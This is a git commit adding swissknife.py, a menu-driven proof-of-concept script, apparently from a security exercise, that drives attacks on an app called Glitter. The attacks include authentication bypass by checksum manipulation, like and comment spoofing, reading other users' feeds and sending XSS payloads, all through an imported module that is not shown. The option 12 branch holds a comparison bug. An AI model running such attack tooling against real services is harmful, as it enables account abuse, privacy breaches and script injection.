d6ae3a3083dfa3f4517c73ea883526c495b9573c
eli7382 <eli.zaberchik@gmail.com>
2025-07-06 11:01:57 +0300

    Create swissknife.py

---
+++ swissknife.py
@@ -0,0 +1,67 @@
+import glitter
+
+def print_menu():
+    """
+    a function to print the vulnerabilities menu to the user
+    :return: none
+    """
+    print("GLITTER APP VULNERABILITY POC\n1. Authentication Bypass (Login with checksum manipulation)\n2. Send Multiple Likes from Same User\n3. Send glit with different profile image\n4. Send Like with Fake Username\n5. Send Glit with Past Date\n6. Access Other User's Feed\n7. Send to Private Account\n8. Send Glit with Colored Font\n9. Send XSS Image Payload\n10. Send XSS Link Payload\n11. Send Comment with Fake Name\n12. Send Multiple Wows from Same User\n0. Exit")
+
+
+def main():
+    while True:
+        global username
+        username = input("Enter your username")
+        print_menu()
+        choice = input("\nEnter your choice: ")
+        if choice == "0":
+            print("Exiting...")
+            break
+        elif choice == "1":
+            username = input("Enter username to bypass auth (for example: !@#098): ")
+            sock, user_id = glitter.login_with_checksum_bypass(username)
+            if sock:
+                sock.close()
+        elif int(choice) in range(1, 13):
+            sock, user_id = glitter.login_with_checksum_bypass("!@#098")
+            if choice == "2":
+                glit_id = input("Enter the glit_id of the glit to like it (for example: 81199): ")
+                count = int(input("Enter the amount of likes you would like to do: "))
+                glitter.send_multiple_likes(sock, user_id, glit_id, count)
+            elif choice == "3":
+                profile_image = input("enter the profile image you want to send a message with (1-8): ")
+                glitter.send_glit_with_different_profile_image(sock, user_id, profile_image)
+            elif choice == "4":
+                glit_id = input("Enter the glit_id of the glit to like it (for example: 81199): ")
+                fake_name = input("enter fake username: ")
+                glitter.send_like_with_fake_name(sock, user_id, glit_id, fake_name)
+            elif choice == "5":
+                glitter.send_glit_from_past(sock, user_id)
+            elif choice == "6":
+                target_user_id = input("Enter the target's user_id you want to see it's feed (for example: 22779): ")
+                glitter.access_other_user_feed(sock, target_user_id)
+            elif choice == "7":
+                target_user_id = input("Enter the target's user_id you want to send a glit to (for example: 22779): ")
+                glitter.send_to_private_account(sock, user_id, target_user_id)
+            elif choice == "8":
+                color = input("Enter the color you want the text to be (for example: white, blue, purple): ")
+                glitter.send_colored_font_glit(sock, user_id, color)
+            elif choice == "9":
+                glitter.send_xss_image_glit(sock, user_id)
+            elif choice == "10":
+                glitter.send_xss_link_glit(sock, user_id)
+            elif choice == "11":
+                glit_id = input("Enter the glit_id of the glit you want to comment on (for example: 81199): ")
+                fake_name = input("enter fake username: ")
+                glitter.send_comment_fake_name(sock, user_id, glit_id, fake_name)
+            elif choice == "12":
+                glit_id == input("Enter the glit_id of the glit you would send a wow on it(for example: 81199): ")
+                count = int(input("Enter the amount of wows you would like to do: "))
+                glitter.send_multiple_wows(sock, user_id, glit_id, count)
+            sock.close()
+        else:
+            print("Wrong choice, try again")
+
+
+if __name__ == "__main__":
+    main()
